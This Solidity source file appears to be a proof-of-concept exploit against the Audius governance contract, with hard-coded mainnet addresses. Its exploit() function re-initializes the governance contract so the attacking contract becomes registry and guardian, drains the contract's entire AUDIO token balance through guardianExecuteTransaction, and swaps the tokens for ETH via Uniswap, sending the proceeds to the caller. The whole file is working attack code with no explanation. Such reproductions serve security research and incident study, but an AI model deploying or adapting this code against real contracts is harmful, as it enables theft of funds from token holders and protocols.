// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@uniswap/v2-periphery/interfaces/IUniswapV2Router02.sol";
import "./AudiusInterfaces.sol";

contract AudiusExploitWithoutProposal {
    address constant governanceAddress =
        0x4DEcA517D6817B6510798b7328F2314d3003AbAC;
    IGovernance constant governance = IGovernance(governanceAddress);
    address constant audioTokenAddress =
        0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
    ERC20 constant audioToken = ERC20(audioTokenAddress);
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant router = IUniswapV2Router02(routerAddress);

    function exploit() public {
        governance.initialize({
            _registryAddress: address(this),
            _votingPeriod: 3,
            _executionDelay: 0,
            _votingQuorumPercent: 1,
            _maxInProgressProposals: 4,
            _guardianAddress: address(this)
        });

        governance.guardianExecuteTransaction({
            _targetContractRegistryKey: bytes32(""),
            _callValue: 0,
            _functionSignature: "transfer(address,uint256)",
            _callData: abi.encode(
                address(this), audioToken.balanceOf(address(governance))
                )
        });

        audioToken.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = audioTokenAddress;
        path[1] = router.WETH();
        router.swapExactTokensForETH(
            audioToken.balanceOf(address(this)),
            680 ether,
            path,
            msg.sender,
            block.timestamp
        );
    }

    function getContract(bytes32)
        external
        pure
        returns (address)
    {
        return audioTokenAddress;
    }
}